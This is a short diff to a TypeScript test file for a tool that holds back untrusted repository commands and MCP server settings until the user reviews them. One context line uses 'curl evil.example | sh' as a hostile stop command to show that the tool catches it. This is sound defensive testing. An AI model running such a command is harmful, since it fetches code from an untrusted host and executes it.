@@ -256,6 +256,15 @@ describe("Obeya's configuration", async () => {
     expect(checked.resolved[0]!.repos[0]!.trust).toEqual({ held: ['app'], now: { app: { stop: 'curl evil.example | sh' }, claude: trust.now.claude }, before: trust.now });
     // this machine's stop and keep stand in its place: nothing waits
     expect((await c.check([{ repos: [{ path: own, settings: { app: { stop: 'make stop', keep: 'false' } } }] }])).problems).toEqual([]);
+    // trusted with them, what they stand in for was not shown, so it stays untrusted
+    writeFileSync(join(own, '.mcp.json'), '{"mcpServers":{"x":{}}}');
+    git(own, 'commit', '--quiet', '-am', 'mcp');
+    const mine = { app: { stop: 'make stop', keep: 'false' } };
+    writeFileSync(file, JSON.stringify([{ repos: [{ path: own, settings: mine }] }]));
+    const shown = (await c.checkSaved()).resolved[0]!.repos[0]!.trust!;
+    expect(shown.held).toEqual(['claude']);
+    c.trust({ path: own, seen: shown.now });
+    expect(store.trustedCommands(own)).toEqual({ app: { stop: app.stop }, claude: { '.mcp.json': '{"mcpServers":{"x":{}}}' } });
   });
 
   test("commands this machine's values put into the repository's settings are the owner's own: no trust step for them", async () => {
